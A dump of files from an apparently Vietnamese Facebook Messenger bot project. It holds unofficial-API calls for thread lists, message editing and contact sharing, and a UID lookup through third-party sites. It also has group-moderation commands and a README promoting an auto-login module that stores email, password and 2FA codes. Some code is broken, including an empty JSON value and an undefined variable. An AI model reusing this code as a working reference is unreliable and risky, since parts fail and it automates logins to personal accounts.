mapNicknames(customizationInfo) {\n  return (customizationInfo && customizationInfo.participant_customizations) ? customizationInfo.participant_customizations.map(u => {\n    return {\n      \"userID\": u.participant_id,\n      \"nickname\": u.nickname\n    };\n  }) : [];\n}\n\nfunction formatThreadList(data) {\n  return data.map(t => {\n    let lastMessageNode = (t.last_message && t.last_message.nodes && t.last_message.nodes.length > 0) ? t.last_message.nodes[0] : null;\n    return {\n      threadID: t.thread_key ? utils.formatID(t.thread_key.thread_fbid || t.thread_key.other_user_id) : null, // shall never be null\n      name: getThreadName(t),\n      unreadCount: t.unread_count,\n      messageCount: t.messages_count,\n      imageSrc: t.image ? t.image.uri : null,\n      emoji: t.customization_info ? t.customization_info.emoji : null,\n      color: formatColor(t.customization_info ? t.customization_info.outgoing_bubble_color : null),\n      nicknames: mapNicknames(t.customization_info),\n      muteUntil: t.mute_until,\n      participants: formatParticipants(t.all_participants),\n      adminIDs: t.thread_admins.map(a => a.id),\n      folder: t.folder,\n      isGroup: t.thread_type === \"GROUP\",\n      // rtc_call_data: t.rtc_call_data, // TODO: format and document this\n      // isPinProtected: t.is_pin_protected, // feature from future? always false (2018-04-04)\n      customizationEnabled: t.customization_enabled, // false for ONE_TO_ONE with Page or ReducedMessagingActor\n      participantAddMode: t.participant_add_mode_as_string, // \"ADD\" if \"GROUP\" and null if \"ONE_TO_ONE\"\n      montageThread: t.montage_thread ? Buffer.from(t.montage_thread.id, \"base64\").toString() : null, // base64 encoded string \"message_thread:0000000000000000\"\n      // it is not userID nor any other ID known to me...\n      // can somebody inspect it? where is it used?\n      // probably Messenger Day uses it\n      reactionsMuteMode: t.reactions_mute_mode,\n      mentionsMuteMode: t.mentions_mute_mode,\n      isArchived: t.has_viewer_archived,\n      isSubscribed: t.is_viewer_subscribed,\n      timestamp: t.updated_time_precise, // in miliseconds\n      // isCanonicalUser: t.is_canonical_neo_user, // is it always false?\n      // TODO: how about putting snippet in another object? current implementation does not handle every possibile message type etc.\n      snippet: lastMessageNode ? lastMessageNode.snippet : null,\n      snippetAttachments: lastMessageNode ? lastMessageNode.extensible_attachment : null, // TODO: not sure if it works\n      snippetSender: lastMessageNode ? utils.formatID((lastMessageNode.message_sender.messaging_actor.id || \"\").toString()) : null,\n      lastMessageTimestamp: lastMessageNode ? lastMessageNode.timestamp_precise : null, // timestamp in miliseconds\n      lastReadTimestamp: (t.last_read_receipt && t.last_read_receipt.nodes.length > 0)\n        ? (t.last_read_receipt.nodes[0] ? t.last_read_receipt.nodes[0].timestamp_precise : null)\n        : null, // timestamp in miliseconds\n      cannotReplyReason: t.cannot_reply_reason, // TODO: inspect possible values\n      approvalMode: Boolean(t.approval_mode),\n\n      // @Legacy\n      participantIDs: formatParticipants(t.all_participants).map(participant => participant.userID),\n      threadType: t.thread_type === \"GROUP\" ? 2 : 1 // \"GROUP\" or \"ONE_TO_ONE\"\n    };\n  });\n}\n\nmodule.exports = function (defaultFuncs, api, ctx) {\n  return function getThreadList(limit, timestamp, tags, callback) {\n    if (!callback && (utils.getType(tags) === \"Function\" || utils.getType(tags) === \"AsyncFunction\")) {\n      callback = tags;\n      tags = [\"\"];\n    }\n    if (utils.getType(limit) !== \"Number\" || !Number.isInteger(limit) || limit <= 0) throw { error: \"getThreadList: limit must be a positive integer\" };\n\n    if (utils.getType(timestamp) !== \"Null\" && (utils.getType(timestamp) !== \"Number\" || !Number.isInteger(timestamp))) throw { error: \"getThreadList: timestamp must be an integer or null\" };\n\n    if (utils.getType(tags) === \"String\") tags = [tags];\n    if (utils.getType(tags) !== \"Array\") throw { error: \"getThreadList: tags must be an array\" };\n\n    var resolveFunc = function () { };\n    var rejectFunc = function () { };\n    var returnPromise = new Promise(function (resolve, reject) {\n      resolveFunc = resolve;\n      rejectFunc = reject;\n    });\n\n    if (utils.getType(callback) !== \"Function\" && utils.getType(callback) !== \"AsyncFunction\") {\n      callback = function (err, data) {\n        if (err) return rejectFunc(err);\n        resolveFunc(data);\n      };\n    }\n\n    const form = {\n      \"av\": ctx.globalOptions.pageID,\n      \"queries\": JSON.stringify({\n        \"o0\": {\n          // This doc_id was valid on 2020-07-20\n          \"doc_id\": \"3336396659757871\",\n          \"query_params\": {\n            \"limit\": limit + (timestamp ? 1 : 0),\n            \"before\": timestamp,\n            \"tags\": tags,\n            \"includeDeliveryReceipts\": true,\n            \"includeSeqID\": false\n          }\n        }\n      }),\n      \"batch_name\": \"MessengerGraphQLThreadlistFetcher\"\n    };\n\n    defaultFuncs\n      .post(\"https://www.facebook.com/api/graphqlbatch/\", ctx.jar, form)\n      .then(utils.parseAndCheckLogin(ctx, defaultFuncs))\n      .then((resData) => {\n        if (resData[resData.length - 1].error_results > 0) throw resData[0].o0.errors;\n\n        if (resData[resData.length - 1].successful_results === 0) throw { error: \"getThreadList: there was no successful_results\", res: resData };\n\n        // When we ask for threads using timestamp from the previous request,\n        // we are getting the last thread repeated as the first thread in this response.\n        // .shift() gets rid of it\n        // It is also the reason for increasing limit by 1 when timestamp is set\n        // this way user asks for 10 threads, we are asking for 11,\n        // but after removing the duplicated one, it is again 10\n        if (timestamp) resData[0].o0.data.viewer.message_threads.nodes.shift();\n\n        callback(null, formatThreadList(resData[0].o0.data.viewer.message_threads.nodes));\n      })\n      .catch((err) => {\n        log.error(\"getThreadList\", \"L·ªói: getThreadList C√≥ Th·ªÉ Do B·∫°n Spam Qu√° Nhi·ªÅu, H√£y Th·ª≠ L·∫°i !\");\n        return callback(err);\n      });\n\n    return returnPromise;\n  };\n};\n","path":null,"size_bytes":9746,"size_tokens":null},"lib/Fca-Horizon-Remastered/Extra/ExtraFindUID.js":{"content":"'use strict';\n\nconst got = global.Fca.Require.Fetch;\n\n/**\n * @param {string | URL} url\n * @param {{ sendMessage: (arg0: string, arg1: any) => any; }} api\n */\nasync function getUIDSlow(url,api) {\n    var FormData =  require(\"form-data\");\n    var Form = new FormData();\n\tvar Url = new URL(url);\n    Form.append('username', Url.pathname.replace(/\\//g, \"\"));\n\ttry {\n        var data = await got.post('https://api.findids.net/api/get-uid-from-username',{\n            body: Form,\n            userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.79 Safari/537.36'\n        })\n\t} catch (e) {\n        console.log(global.Fca.Data.event.threadID,e)\n        return api.sendMessage(\"L·ªói: \" + e.message,global.Fca.Data.event.threadID);\n\t}\n    if (JSON.parse(data.body.toString()).status != 200) return api.sendMessage('ƒê√£ b·ªã l·ªói !',global.Fca.Data.event.threadID)\n    if (typeof JSON.parse(data.body.toString()).error === 'string') return \"errr\"\n    else return JSON.parse(data.body.toString()).data.id || \"n·ªãt\";\n}\n\n/**\n * @param {string | URL} url\n * @param {{ sendMessage: (arg0: string, arg1: any, arg2: any) => any; }} api\n */\nasync function getUIDFast(url,api) {\n    var FormData =  require(\"form-data\");\n    var Form = new FormData();\n\tvar Url = new URL(url);\n    Form.append('link', Url.href);\n    try {\n        var data = await got.post('https://id.traodoisub.com/api.php',{\n            body: Form\n        })\n\t} catch (e) {\n        return api.sendMessage(\"L·ªói: \" + e.message,global.Fca.Data.event.threadID,global.Fca.Data.event.messageID);\n\t}\n    if (JSON.parse(data.body.toString()).error) return api.sendMessage(JSON.parse(data.body.toString()).error,global.Fca.Data.event.threadID,global.Fca.Data.event.messageID);\n    else return JSON.parse(data.body.toString()).id || \"co cai nit huhu\";\n}\n\n/**\n * @param {any} url\n * @param {any} api\n */\nasync function getUID(url,api) {\n    var getUID = await getUIDFast(url,api);\n        if (!isNaN(getUID) == true) return getUID;  \n            else {\n                let getUID = await getUIDSlow(url,api);\n            if (!isNaN(data) == true) return getUID;\n        else return null;\n    }\n}\n\nmodule.exports = getUID;        ","path":null,"size_bytes":2231,"size_tokens":null},"lib/Fca-Horizon-Remastered/src/editMessage.js":{"content":"/* eslint-disable linebreak-style */\n\"use strict\";\n\nvar utils = require(\"../utils\");\n\nmodule.exports = function (defaultFuncs, api, ctx) {\n\treturn function editMessage(messageID, changedText, callback) {\n\t\tvar resolveFunc = function () { };\n\t\tvar rejectFunc = function () { };\n\n\t\tvar returnPromise = new Promise(function (resolve, reject) {\n\t\t\tresolveFunc = resolve;\n\t\t\trejectFunc = reject;\n\t\t});\n\n\t\tif (!callback) {\n\t\t\tcallback = function (err, data) {\n\t\t\t\tif (err) return rejectFunc(err);\n\t\t\t\tresolveFunc(data);\n\t\t\t};\n\t\t}\n\t\tctx.mqttClient.publish('/ls_req', \n\t\t\tJSON.stringify({\n\t\t\t\tapp_id: \"2220391788200892\",\n\t\t\t\tpayload: JSON.stringify({\n\t\t\t\t\ttasks: [{\n\t\t\t\t\t\t\tlabel: 742,\n\t\t\t\t\t\t\tpayload: JSON.stringify({\n                                message_id: messageID,\n                                text: changedText //how tf this didn't need threadID:D\n\t\t\t\t\t\t\t}),\n\t\t\t\t\t\t\tqueue_name: 'edit_message',\n\t\t\t\t\t\t\ttask_id: Math.random() * 1001 << 0,\n\t\t\t\t\t\t\tfailure_count: null,\n\t\t\t\t\t}],\n\t\t\t\t\tepoch_id: utils.generateOfflineThreadingID(),\n\t\t\t\t\tversion_id: '7992185107461798',\n\t\t\t\t}),\n\t\t\t\trequest_id: ++ctx.req_ID,\n\t\t\t\ttype: 3\n\t\t\t}),\n            {\n                qos: 1,\n                retain: false,\n            }\n\t\t);\n        ctx.callback_Task[ctx.req_ID] = new Object({\n            callback,\n            type: \"editMessage\"\n        });\n\t\treturn returnPromise;\n\t};\n};\n","path":null,"size_bytes":1361,"size_tokens":null},"lib/fca-auto/src/Dev_shareTest2.js":{"content":"\"use strict\";\n\nvar utils = require(\"../utils\");\nvar log = require(\"npmlog\");\n\nmodule.exports = function (defaultFuncs, api, ctx) {\n\treturn async function shareTest(text, senderID, threadID, callback) {\n\t\tvar resolveFunc = function () { };\n\t\tvar rejectFunc = function () { };\n\t\tvar returnPromise = new Promise(function (resolve, reject) {\n\t\t\tresolveFunc = resolve;\n\t\t\trejectFunc = reject;\n\t\t});\n\t\tif (!callback) {\n\t\t\tcallback = function (err, data) {\n\t\t\t\tif (err) return rejectFunc(err);\n\t\t\t\tresolveFunc(data);\n\t\t\t};\n\t\t}\n\t\tctx.req_ID++;\n\t\tvar form = JSON.stringify({\n\t\t\t\t\t\t\"app_id\": \"2220391788200892\",\n\t\t\t\t\t\t\"payload\": JSON.stringify({\n\t\t\t\t\t\t\t\ttasks: [{\n                                    label: '46',\n\t\t\t\t\t\t\t\t\t\tpayload: JSON.stringify({\n\t\t\t\t\t\t\t\t\t\t\t//\"contact_id\": senderID,\n                                            \"otid\": utils.generateOfflineThreadingID(),\n                                            \"source\": \"1572866\",\n\t\t\t\t\t\t\t\t\t\t\t\"sync_group\": 1,\n                                            \"send_type\": 7,\n                                            \"mark_thread_read\": 1,\n                                            \"url\": \"\",\n                                            \"attribution_app_id\": ,\n                                            \"skip_url_preview_gen\": 0,\n                                            \"text_has_links\": 0,\n                                            \"multitab_env\": 0,\n\t\t\t\t\t\t\t\t\t\t\t//\"text\": text || \"\",\n\t\t\t\t\t\t\t\t\t\t\t\"thread_id\": 6711308795587598,\n                                            \"initiating_source\": 0\n\t\t\t\t\t\t\t\t\t\t}),\n\t\t\t\t\t\t\t\t\t\tqueue_name: '6711308795587598',\n\t\t\t\t\t\t\t\t\t\ttask_id: Math.random() * 1001 << 0,\n\t\t\t\t\t\t\t\t\t\tfailure_count: null,\n\t\t\t\t\t\t\t\t},\n                            {\n                                label: '21',\n                                payload: JSON.stringify({\n                                    \"thread_id\": 6711308795587598,\n                                    last_read_watermark_ts: 1713035994383,\n                                    sync_group: 1\n                                }),\n                                queue_name: 6711308795587598,\n                                task_id: Math.random() * 1001 << 0,\n                                failure_count: null\n                            }],\n\t\t\t\t\t\t\t\tepoch_id: utils.generateOfflineThreadingID(),\n\t\t\t\t\t\t\t\tversion_id: '7191105584331330',\n                                data_trace_id: \"\"\n\t\t\t\t\t\t}),\n\t\t\t\t\t\t\"request_id\": ctx.req_ID,\n\t\t\t\t\t\t\"type\": 3\n\t\t\t\t});\n\t\tctx.mqttClient.publish('/ls_req',form)\n\n\t\treturn returnPromise;\n\t};\n};\n","path":null,"size_bytes":2550,"size_tokens":null},"modules/commands/antiout.js":{"content":"module.exports.config = {\n    name: \"antiout\",\n    version: \"1.0.1\",\n    credits: \"DungUwU - Modified by GPT\",\n    hasPermssion: 1,\n    description: \"B·∫≠t t·∫Øt antiout\",\n    usages: \"antiout on/off\",\n    commandCategory: \"Qu·∫£n L√≠ Box\",\n    cooldowns: 0\n};\n\nmodule.exports.run = async ({ api, event, Threads }) => {\n    let data = (await Threads.getData(event.threadID)).data || {};\n    if (typeof data[\"antiout\"] == \"undefined\" || data[\"antiout\"] == false) {\n        data[\"antiout\"] = true;\n    } else {\n        data[\"antiout\"] = false;\n    }\n\n    await Threads.setData(event.threadID, { data });\n    global.data.threadData.set(parseInt(event.threadID), data);\n\n    return api.sendMessage(\n        `‚úÖ ƒê√£ ${(data[\"antiout\"] == true) ? \"b·∫≠t\" : \"t·∫Øt\"} th√†nh c√¥ng ch·∫ø ƒë·ªô antiout!${(data[\"antiout\"] == true) ? \"\\n‚ö†Ô∏è L∆∞u √Ω: C√≥ th·ªÉ kh√¥ng ho·∫°t ƒë·ªông v·ªõi nh·ªØng ng∆∞·ªùi ƒë√£ ch·∫∑n bot ho·∫∑c ch∆∞a k·∫øt b·∫°n v·ªõi bot.\" : \"\"}`,\n        event.threadID\n    );\n};\n","path":null,"size_bytes":993,"size_tokens":null},"lib/fca-auto/README.md":{"content":"# üåê SPN.IO.VN ‚Äì N·ªÅn t·∫£ng Gi·∫£i ƒë·∫•u & B·∫£ng x·∫øp h·∫°ng Free Fire\n\n[![Website](https://img.shields.io/badge/Website-spn.io.vn-blue?style=for-the-badge&logo=google-chrome)](https://spn.io.vn)\n[![Platform](https://img.shields.io/badge/N·ªÅn%20T·∫£ng-Mi·ªÖn%20Ph√≠-brightgreen?style=for-the-badge&logo=freebsd)](https://spn.io.vn)\n[![Security](https://img.shields.io/badge/An%20To√†n%20%26%20B·∫£o%20M·∫≠t-Yes-green?style=for-the-badge&logo=lock)](https://spn.io.vn)\n\nüî• **[https://spn.io.vn](https://spn.io.vn)** ‚Äì N·ªÅn t·∫£ng h·ªó tr·ª£ **t√≠nh ƒëi·ªÉm, t·∫°o b·∫£ng x·∫øp h·∫°ng, v√† qu·∫£n l√Ω gi·∫£i ƒë·∫•u Free Fire** v·ªõi c√°c t√≠nh nƒÉng c·ªët l√µi ho√†n to√†n mi·ªÖn ph√≠.\n\n![Giao di·ªán SPN.IO.VN](https://i.imgur.com/xwx1Q8M.png)\n\n---\n\n## ‚ú® T√≠nh NƒÉng N·ªïi B·∫≠t\n\n-   üèÜ **T·ªï Ch·ª©c Gi·∫£i ƒê·∫•u Chuy√™n Nghi·ªáp:** T·∫°o v√† qu·∫£n l√Ω gi·∫£i ƒë·∫•u Free Fire d·ªÖ d√†ng.\n-   üìä **Qu·∫£n L√Ω To√†n Di·ªán:** H·ªó tr·ª£ t·∫°o b·∫£ng x·∫øp h·∫°ng, line-up, boxscrim, qu·∫£n l√Ω ƒë·ªôi h√¨nh v√† t·∫°o m√£ QR ti·ªán l·ª£i.\n-   üé® **Th∆∞ Vi·ªán Layout ƒêa D·∫°ng:** Kho giao di·ªán phong ph√∫, ƒë·∫πp m·∫Øt (VIP, th∆∞·ªùng, ƒë·ªôc quy·ªÅn).\n-   üîê **An To√†n & B·∫£o M·∫≠t:** N·ªÅn t·∫£ng an to√†n, b·∫£o m·∫≠t cho m·ªçi ng∆∞·ªùi d√πng.\n-   ‚ö° **T·ª± ƒê·ªông H√≥a:** T√≠ch h·ª£p bot t√≠nh ƒëi·ªÉm t·ª± ƒë·ªông v√† h·ªá th·ªëng n·∫°p ti·ªÅn nhanh ch√≥ng.\n\n---\n\n## üí∞ Chi Ph√≠ D·ªãch V·ª•\n\n-   ‚úÖ **Mi·ªÖn ph√≠:** To√†n b·ªô c√°c t√≠nh nƒÉng ch√≠nh nh∆∞ t·∫°o gi·∫£i ƒë·∫•u, qu·∫£n l√Ω ƒë·ªôi, t√≠nh ƒëi·ªÉm v√† s·ª≠ d·ª•ng c√°c layout ti√™u chu·∫©n.\n-   üî∂ **C√≥ ph√≠:** M·ªôt s·ªë d·ªãch v·ª• n√¢ng cao ho·∫∑c giao d·ªãch th√¥ng qua b√™n th·ª© ba (v√≠ d·ª•: ph√≠ g·∫°ch th·∫ª c√†o, ph√≠ giao d·ªãch ng√¢n h√†ng) c√≥ th·ªÉ ph√°t sinh m·ªôt kho·∫£n ph√≠ nh·ªè ƒë·ªÉ duy tr√¨ v√† v·∫≠n h√†nh h·ªá th·ªëng. M·ªçi chi ph√≠ ƒë·ªÅu ƒë∆∞·ª£c hi·ªÉn th·ªã r√µ r√†ng tr∆∞·ªõc khi b·∫°n th·ª±c hi·ªán giao d·ªãch.\n\nüëâ N·∫øu b·∫°n l√† m·ªôt nh√† t·ªï ch·ª©c gi·∫£i ƒë·∫•u Free Fire, **[spn.io.vn](https://spn.io.vn)** l√† c√¥ng c·ª• kh√¥ng th·ªÉ thi·∫øu.\nüöÄ Tr·∫£i nghi·ªám ngay t·∫°i: **[https://spn.io.vn](https://spn.io.vn)**\n\n---\n\n# ü§ñ FCA AutoLogin ‚Äì Horizon Edition\n\n**FCA AutoLogin** l√† m·ªôt module m·ªü r·ªông cho **FCA-HZI (Horizon Remake)**, ƒë∆∞·ª£c thi·∫øt k·∫ø ƒë·ªÉ t·ª± ƒë·ªông h√≥a ho√†n to√†n qu√° tr√¨nh ƒëƒÉng nh·∫≠p Facebook, c·ª±c k·ª≥ h·ªØu √≠ch khi v·∫≠n h√†nh bot Messenger 24/7.\n\n---\n\n## üîë Ch·ª©c NƒÉng Ch√≠nh\n\n-   üîÑ **T·ª± ƒê·ªông ƒêƒÉng Nh·∫≠p:** Khi `appState` h·∫øt h·∫°n ho·∫∑c t√†i kho·∫£n b·ªã ƒëƒÉng xu·∫•t, bot s·∫Ω t·ª± ƒë·ªông ƒëƒÉng nh·∫≠p l·∫°i b·∫±ng email, m·∫≠t kh·∫©u v√† m√£ 2FA.\n-   üõ°Ô∏è **X·ª≠ L√Ω Checkpoint:** T·ª± ƒë·ªông g·ª≠i c·∫£nh b√°o khi t√†i kho·∫£n b·ªã checkpoint v√† h·ªó tr·ª£ qu√° tr√¨nh kh√¥i ph·ª•c.\n-   üíæ **T·ª± ƒê·ªông L∆∞u `appState`:** Sau m·ªói l·∫ßn ƒëƒÉng nh·∫≠p th√†nh c√¥ng, `appState` m·ªõi s·∫Ω ƒë∆∞·ª£c t·ª± ƒë·ªông l∆∞u l·∫°i ƒë·ªÉ s·ª≠ d·ª•ng cho c√°c phi√™n ti·∫øp theo.\n-   ‚ö° **T·ª± ƒê·ªông Kh·ªüi ƒê·ªông L·∫°i:** Khi m·∫•t k·∫øt n·ªëi ho·∫∑c g·∫∑p l·ªói, bot s·∫Ω t·ª± kh·ªüi ƒë·ªông l·∫°i m√† kh√¥ng c·∫ßn can thi·ªáp th·ªß c√¥ng.\n\n---\n\n## üìÇ C·∫•u Tr√∫c Th∆∞ M·ª•c D·ª± √Ån\n\n```yaml\n/filebot\n‚îú‚îÄ‚îÄ fca/              # Th∆∞ vi·ªán FCA-HZI (Horizon)\n‚îú‚îÄ‚îÄ lib/fblogin.js    # Module ch√≠nh x·ª≠ l√Ω AutoLogin\n‚îú‚îÄ‚îÄ index.js          # File kh·ªüi ƒë·ªông bot\n‚îú‚îÄ‚îÄ config.json       # File c·∫•u h√¨nh (bao g·ªìm b·∫≠t/t·∫Øt AutoLogin)\n‚îî‚îÄ‚îÄ appstate.json     # File appState ƒë∆∞·ª£c l∆∞u v√† c·∫≠p nh·∫≠t t·ª± ƒë·ªông\n","path":null,"size_bytes":3580,"size_tokens":null},"lib/fca-auto/src/shareContact.js":{"content":"/* eslint-disable linebreak-style */\n\"use strict\";\n\nvar utils = require(\"../utils\");\n\nmodule.exports = function(defaultFuncs, api, ctx) {\n  return function shareContact(text, senderID, threadID, callback) {\n    let resolveFunc = function() {};\n    let rejectFunc = function() {};\n    \n    const returnPromise = new Promise(function(resolve, reject) {\n      resolveFunc = resolve;\n      rejectFunc = reject;\n    });\n\n    if (!senderID || !threadID) {\n      const error = new Error(\"senderID and threadID are required parameters\");\n      if (callback) callback(error);\n      return Promise.reject(error);\n    }\n\n    const safeCallback = function(err, data) {\n      if (callback && typeof callback === 'function') {\n        callback(err, data);\n      }\n      if (err) {\n        rejectFunc(err);\n      } else {\n        resolveFunc(data);\n      }\n    };\n\n    try {\n      if (!ctx.mqttClient) {\n        throw new Error(\"MQTT client not initialized\");\n      }\n\n      const reqID = ++ctx.req_ID;\n      const messageData = {\n        app_id: \"2220391788200892\",\n        payload: JSON.stringify({\n          tasks: [{\n            label: 359,\n            payload: JSON.stringify({\n              contact_id: senderID,\n              sync_group: 1,\n              text: text || \"\",\n              thread_id: threadID\n            }),\n            queue_name: 'xma_open_contact_share',\n            task_id: Math.floor(Math.random() * 1001),\n            failure_count: null,\n          }],\n          epoch_id: require('../utils').generateOfflineThreadingID(),\n          version_id: '7214102258676893',\n        }),\n        request_id: reqID,\n        type: 3\n      };\n\n      if (!ctx.callback_Task) {\n        ctx.callback_Task = {};\n      }\n      ctx.callback_Task[reqID] = {\n        callback: safeCallback,\n        type: \"shareContact\"\n      };\n\n      ctx.mqttClient.publish('/ls_req', JSON.stringify(messageData), {\n        qos: 1,\n        retain: false\n      });\n\n    } catch (err) {\n      safeCallback(err);\n    }\n\n    return returnPromise;\n  };\n};","path":null,"size_bytes":2027,"size_tokens":null},"modules/commands/checktt.js":{"content":"module.exports.config = {\n    name: \"checktt\", // T√™n l·ªánh, ƒë∆∞·ª£c s·ª≠ d·ª•ng trong vi·ªác g·ªçi l·ªánh\n    version: \"1.0.1\", // phi√™n b·∫£n c·ªßa module n√†y\n    hasPermssion: 0, // Quy·ªÅn h·∫°n s·ª≠ d·ª•ng, v·ªõi 0 l√† to√†n b·ªô th√†nh vi√™n, 1 l√† qu·∫£n tr·ªã vi√™n tr·ªü l√™n, 2 l√† admin/owner\n    credits: \"DungUwU && Nghƒ©a mod th√™m by tpk\", // C√¥ng nh·∫≠n module s·ªü h·ªØu l√† ai\n    description: \"Check t∆∞∆°ng t√°c ng√†y/tu·∫ßn/to√†n b·ªô\", // Th√¥ng tin chi ti·∫øt v·ªÅ l·ªánh\n    commandCategory: \"Qu·∫£n L√≠ Box\", // Thu·ªôc v√†o nh√≥m n√†o: system, other, game-sp, game-mp, random-img, edit-img, media, economy, ...\n    usages: \"< checktt all/week/day/locmem > \", // C√°ch s·ª≠ d·ª•ng l·ªánh\n    cooldowns: 5, // Th·ªùi gian m·ªôt ng∆∞·ªùi c√≥ th·ªÉ l·∫∑p l·∫°i l·ªánh\n    dependencies: {\n        \"fs\": \" \",\n        \"moment-timezone\": \" \"\n    }\n};\n\nconst path = __dirname + '/tuongtac/checktt/';\nconst { min } = require('moment-timezone');\nconst moment = require('moment-timezone');\nconst { format } = require('path');\n\nmodule.exports.onLoad = () => {\n    const fs = require('fs');\n    if (!fs.existsSync(path) || !fs.statSync(path).isDirectory()) {\n        fs.mkdirSync(path, { recursive: true });\n    }\n  setInterval(() => {\n    const today = moment.tz(\"Asia/Ho_Chi_Minh\").day();\n    const checkttData = fs.readdirSync(path);\n    checkttData.forEach(file => {\n        if (!file.endsWith('.json')) return; // B·ªè qua file kh√¥ng ph·∫£i JSON\n      \n        const filePath = path + file;\n        try {\n          const content = fs.readFileSync(filePath, 'utf8').trim();\n          if (!content) return; // B·ªè qua file tr·ªëng\n      \n          let fileData = JSON.parse(content);\n      \n          if (fileData.time != today) {\n            setTimeout(() => {\n              try {\n                const delayedContent = fs.readFileSync(filePath, 'utf8').trim();\n                if (!delayedContent) return;\n                let delayedData = JSON.parse(delayedContent);\n                if (delayedData.time != today) {\n                  delayedData.time = today;\n                  fs.writeFileSync(filePath, JSON.stringify(delayedData, null, 4));\n                }\n              } catch (e) {\n                console.error(`[checktt] L·ªói JSON (tr√¨ ho√£n) ·ªü file ${file}:`, e.message);\n              }\n            }, 60 * 1000);\n          }\n        } catch (e) {\n          console.error(`[checktt] L·ªói JSON ·ªü file ${file}:`, e.message);\n        }\n      });\n  }, 60 * 1000);\n}\n\nmodule.exports.handleEvent = async function ({ api, args, Users, event, Threads, }) {\n  const threadInfo = await api.getThreadInfo(event.threadID)\n    if (global.client.sending_top == true) return;\n    const fs = global.nodemodule['fs'];\n    const { threadID, senderID } = event;\n    const today = moment.tz(\"Asia/Ho_Chi_Minh\").day();\n\n    if (!fs.existsSync(path + threadID + '.json')) {\n        const newObj = {\n            total: [],\n            week: [],\n            day: [],\n            time: today\n        };\n        fs.writeFileSync(path + threadID + '.json', JSON.stringify(newObj, null, 4));\n        const threadInfo = await Threads.getInfo(threadID) || {};\n        if (threadInfo.hasOwnProperty('isGroup') && threadInfo.isGroup) {\n            const UserIDs = threadInfo.participantIDs;\n            for (user of UserIDs) {\n                if (!newObj.total.find(item => item.id == user)) {\n                    newObj.total.push({\n                        id: user,\n                        count: 0\n                    });\n                }\n                if (!newObj.week.find(item => item.id == user)) {\n                    newObj.week.push({\n                        id: user,\n                        count: 0\n                    });\n                }\n                if (!newObj.day.find(item => item.id == user)) {\n                    newObj.day.push({\n                        id: user,\n                        count: 0\n                    });\n                }\n            }\n        }\n        fs.writeFileSync(path + threadID + '.json', JSON.stringify(newObj, null, 4));\n    }\n    const threadData = JSON.parse(fs.readFileSync(path + threadID + '.json'));\n    if (threadData.time != today) {\n      global.client.sending_top = true;\n      setTimeout(() => global.client.sending_top = false, 5 * 60 * 1000);\n    }\n    const userData_week_index = threadData.week.findIndex(e => e.id == senderID);\n    const userData_day_index = threadData.day.findIndex(e => e.id == senderID);\n    const userData_total_index = threadData.total.findIndex(e => e.id == senderID);\n    if (userData_total_index == -1) {\n        threadData.total.push({\n            id: senderID,\n            count: 1,\n        });\n    } else threadData.total[userData_total_index].count++;\n    if (userData_week_index == -1) {\n        threadData.week.push({\n            id: senderID,\n            count: 1\n        });\n    } else threadData.week[userData_week_index].count++;\n    if (userData_day_index == -1) {\n        threadData.day.push({\n            id: senderID,\n            count: 1\n        });\n    } else threadData.day[userData_day_index].count++;\n      if (threadData.time != today) {\n         threadData.day.forEach(e => {\n             e.count = 0;\n         });\n         if (today == 1) {\n             threadData.week.forEach(e => {\n                e.count = 0;\n           });\n    }\n        threadData.time = today;\n    }\n\n    fs.writeFileSync(path + threadID + '.json', JSON.stringify(threadData, null, 4));\n}\n\nmodule.exports.run = async function ({ api, event, args, Users, Threads }) {\n  let threadInfo = await api.getThreadInfo(event.threadID);\n    await new Promise(resolve => setTimeout(resolve, 500));\n    const fs = global.nodemodule['fs'];\n    const { threadID, messageID, senderID, mentions } = event;\n    if (!fs.existsSync(path + threadID + '.json')) {\n        return api.sendMessage(\"ùêÇùê°ùêÆÃõùêö ùêúùê®ÃÅ ùê≠ùê°ùê®ÃÇÃÅùêßùê† ùê§ùêûÃÇ ùêùùêÆÃõÃÉ ùê•ùê¢ùêûÃ£ÃÇùêÆ\", threadID);\n    }\n    const threadData = JSON.parse(fs.readFileSync(path + threadID + '.json'));\n    const query = args[0] ? args[0].toLowerCase() : '';\n\n    if(query == 'locmem') {\n        const moment = require(\"moment-timezone\");\n        const today = moment.tz(\"Asia/Ho_Chi_Minh\").day(); // 0 - CN, 6 - Th·ª© 7\n      \n        if (!threadInfo.adminIDs.some(e => e.id == senderID))\n        return api.sendMessage(\"B·∫°n kh√¥ng c√≥ quy·ªÅn s·ª≠ d·ª•ng l·ªánh n√†y.\", threadID);\n\n        const botID = api.getCurrentUserID();\nif (!threadInfo.adminIDs.some(e => e.id == botID)) {\n  return api.sendMessage(\"‚ö†Ô∏è Bot c·∫ßn quy·ªÅn qu·∫£n tr·ªã vi√™n ƒë·ªÉ c√≥ th·ªÉ l·ªçc th√†nh vi√™n!\\nüëâ H√£y c·∫•p quy·ªÅn qu·∫£n tr·ªã vi√™n cho bot tr∆∞·ªõc.\", threadID);\n}\n\n        if (today !== 0 && today !== 6) {\n          const thu = [\"Ch·ªß Nh·∫≠t\", \"Th·ª© Hai\", \"Th·ª© Ba\", \"Th·ª© T∆∞\", \"Th·ª© NƒÉm\", \"Th·ª© S√°u\", \"Th·ª© B·∫£y\"];\n          return api.sendMessage(\n            `H√¥m nay l√† ${thu[today]}.\\nüìå D·ªØ li·ªáu l·ªçc th√†nh vi√™n s·∫Ω ƒë∆∞·ª£c ƒë·∫∑t l·∫°i v√†o m·ªói th·ª© Hai h√†ng tu·∫ßn.\\nüëâ B·∫°n n√™n l·ªçc v√†o Th·ª© B·∫£y ho·∫∑c Ch·ªß Nh·∫≠t ƒë·ªÉ d·ªØ li·ªáu ch√≠nh x√°c h∆°n.`,\n            threadID\n          );\n        }\n      \n        if(!threadInfo.adminIDs.some(e => e.id == senderID))\n          return api.sendMessage(\"B·∫°n kh√¥ng c√≥ quy·ªÅn s·ª≠ d·ª•ng l·ªánh n√†y.\", threadID);\n        if(!threadInfo.isGroup)\n          return api.sendMessage(\"Ch·ªâ c√≥ th·ªÉ s·ª≠ d·ª•ng trong nh√≥m.\", threadID);\n        if(!args[1] || isNaN(args[1]))\n          return api.sendMessage(\"Vui l√≤ng nh·∫≠p s·ªë tin nh·∫Øn t·ªëi thi·ªÉu, v√≠ d·ª•: #checktt locmem 5\", threadID);\n      \n        const minCount = parseInt(args[1]);\n        const allUser = threadInfo.participantIDs;\n        const usersToRemove = [];\n      \n        for (let user of allUser) {\n          if (user == api.getCurrentUserID()) 